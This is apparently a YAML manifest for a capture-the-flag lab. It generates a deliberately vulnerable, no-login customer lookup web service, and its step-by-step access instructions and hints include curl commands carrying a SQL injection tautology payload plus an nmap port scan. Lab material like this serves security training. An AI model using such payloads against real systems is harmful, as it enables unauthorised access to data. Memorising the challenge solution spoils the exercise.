manifest_version: 1
id: http_sqli_customer_lookup
kind: flag-node-generator
name: 'HTTP: SQLi Customer Lookup'
description: No-login HTTP customer lookup with a deliberately vulnerable SQL query
  and realistic support records.
hint_template: Consider how search input affects which records are returned.
runtime:
  type: docker-compose
  compose_file: docker-compose.yml
  service: generator
env:
  WEB_VARIANT_ID: http_sqli_customer_lookup
inputs:
- name: seed
  type: string
  required: true
- name: node_name
  type: string
  required: true
- name: flag_prefix
  type: string
  required: false
- name: web_port
  type: number
  required: false
  default: 8080
artifacts:
  requires:
  - Knowledge(ip)
  produces:
  - Flag(flag_id)
  - FlagDelivery(mode)
  - FlagFile(path)
  - File(path)
  - PortForward(host, port)
  - Directory(host, path)
  - Endpoint(path)
  - Version(service)
  - Vulnerability(host, type)
injects:
- site
inject_candidate_paths:
- /var/www/customer-lookup
- /srv/support/search
- /opt/supportdesk/app
- /home/www-data/customers
access_instructions:
  title: SQL Injection in Customer Lookup
  steps:
  - step: 1
    title: Open the lookup form
    instructions: '```bash

      curl ''http://{{NODE}}:{{PORT}}/search?customer=Acme%20Health''

      ```

      '
  - step: 2
    title: Use a tautology payload
    instructions: '```bash

      curl "http://{{NODE}}:{{PORT}}/search?customer='' OR ''1''=''1"

      ```

      '
  - step: 3
    title: Record the hidden row
    instructions: Record the flag from the hidden SQL result row.
hint_levels:
  low:
  - Consider how search input affects which records are returned.
  medium:
  - 'Service: SQL Injection in Customer Lookup. Target: {{THIS_NODE_NAME}}; TCP port: {{OUTPUT.PortForward(host, port)}}.'
  - |-
    Check the assigned port:
    ```bash
    nmap -sT -sV -p {{OUTPUT.PortForward(host, port)}} {{THIS_NODE_NAME}}
    ```
  high:
  - 'Answer: {{OUTPUT.Flag(flag_id)}}'
  - |-
    Open the lookup form:
    ```bash
    curl 'http://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/search?customer=Acme%20Health'
    ```
  - |-
    Use a tautology payload:
    ```bash
    curl "http://{{THIS_NODE_NAME}}:{{OUTPUT.PortForward(host, port)}}/search?customer=%27%20OR%20%271%27=%271"
    ```
